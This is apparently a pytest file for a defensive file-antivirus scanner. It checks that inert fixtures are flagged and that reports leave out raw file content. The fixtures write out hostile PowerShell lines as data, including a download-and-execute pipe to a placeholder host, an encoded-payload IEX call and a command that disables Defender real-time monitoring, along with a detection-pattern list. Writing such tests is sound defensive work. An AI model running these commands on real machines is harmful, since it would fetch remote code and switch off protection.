from __future__ import annotations

import json
import zipfile
from pathlib import Path

from file_antivirus import run_file_av_scan


def test_file_av_fixture_detects_suspicious_script(tmp_path: Path):
    root = tmp_path / "fixture"
    root.mkdir()
    (root / "benign.txt").write_text("hello this is benign\n", encoding="utf-8")
    (root / "suspicious.ps1").write_text(
        "# inert fixture only\nIEX ([Convert]::FromBase64String('AAAA'))\n",
        encoding="utf-8",
    )
    result = run_file_av_scan(
        paths=[str(root)],
        output_dir=str(tmp_path / "out"),
        clean_output=True,
        bundle_output=True,
        privacy_bundle=True,
    )
    report = json.loads((tmp_path / "out" / "file_av_report.json").read_text(encoding="utf-8"))
    by_path = {Path(item["display_path"]).name: item for item in report["items"] if item["kind"] == "file"}
    assert by_path["benign.txt"]["decision"] == "ALLOW"
    assert by_path["suspicious.ps1"]["decision"] in {"ALLOW_LOG", "REQUIRE_APPROVAL", "BLOCK"}
    assert "encoded_payload_marker" in by_path["suspicious.ps1"]["labels"]
    assert Path(result["result_bundle"]).exists()


def test_file_av_archive_entry_scanning(tmp_path: Path):
    archive = tmp_path / "sample.zip"
    with zipfile.ZipFile(archive, "w") as z:
        z.writestr("benign.txt", "hello")
        z.writestr("bad.ps1", "Invoke-WebRequest http://example.invalid/file | Invoke-Expression")
    run_file_av_scan(
        paths=[str(archive)],
        output_dir=str(tmp_path / "out"),
        clean_output=True,
        bundle_output=False,
    )
    report = json.loads((tmp_path / "out" / "file_av_report.json").read_text(encoding="utf-8"))
    entries = [item for item in report["items"] if item["kind"] == "archive_entry"]
    assert any(item["display_path"].endswith("!bad.ps1") for item in entries)
    bad = [item for item in entries if item["display_path"].endswith("!bad.ps1")][0]
    assert bad["decision"] in {"REQUIRE_APPROVAL", "BLOCK"}


def test_file_av_report_does_not_include_raw_content(tmp_path: Path):
    root = tmp_path / "fixture"
    root.mkdir()
    secret = "SECRET_CONTENT_SHOULD_NOT_APPEAR"
    (root / "note.txt").write_text(secret, encoding="utf-8")
    run_file_av_scan(
        paths=[str(root)],
        output_dir=str(tmp_path / "out"),
        clean_output=True,
        bundle_output=True,
        privacy_bundle=True,
    )
    report_text = (tmp_path / "out" / "file_av_report.json").read_text(encoding="utf-8")
    assert secret not in report_text
    with zipfile.ZipFile(tmp_path / "out" / "pooleshield_results_bundle.zip") as z:
        names = z.namelist()
    assert "file_av_report.json" in names
    assert all("note.txt" not in name for name in names)


def test_file_av_developer_profile_caps_detector_source_noise(tmp_path: Path):
    root = tmp_path / "fixture"
    root.mkdir()
    source = root / "file_antivirus.py"
    source.write_text(
        """# PooleShield defensive purpose test fixture
# Safety boundary: read-only dry-run
RISK_PATTERNS = [
    ('powershell_download_execute', 'Invoke-WebRequest x | Invoke-Expression', 0.36),
    ('defender_tamper_marker', 'Set-MpPreference DisableRealtimeMonitoring', 0.36),
    ('credential_or_secret_marker', 'api_key=', 0.22),
]
def test_fixture():
    assert 'matched static pattern'
""",
        encoding="utf-8",
    )
    run_file_av_scan(
        paths=[str(root)],
        output_dir=str(tmp_path / "out"),
        clean_output=True,
        bundle_output=False,
        risk_profile="developer",
    )
    report = json.loads((tmp_path / "out" / "file_av_report.json").read_text(encoding="utf-8"))
    item = [i for i in report["items"] if i["display_path"].endswith("file_antivirus.py")][0]
    assert item["decision"] == "ALLOW_LOG"
    assert "developer_reference_context" in item["labels"]
    assert item["risk_score"] <= 0.34


def test_file_av_standard_profile_still_blocks_same_detector_text(tmp_path: Path):
    root = tmp_path / "fixture"
    root.mkdir()
    source = root / "file_antivirus.py"
    source.write_text(
        """Invoke-WebRequest http://example.invalid/x | Invoke-Expression
Set-MpPreference DisableRealtimeMonitoring
api_key='demo'
""",
        encoding="utf-8",
    )
    run_file_av_scan(
        paths=[str(root)],
        output_dir=str(tmp_path / "out"),
        clean_output=True,
        bundle_output=False,
    )
    report = json.loads((tmp_path / "out" / "file_av_report.json").read_text(encoding="utf-8"))
    item = [i for i in report["items"] if i["display_path"].endswith("file_antivirus.py")][0]
    assert item["decision"] in {"REQUIRE_APPROVAL", "BLOCK"}
    assert "developer_reference_context" not in item["labels"]
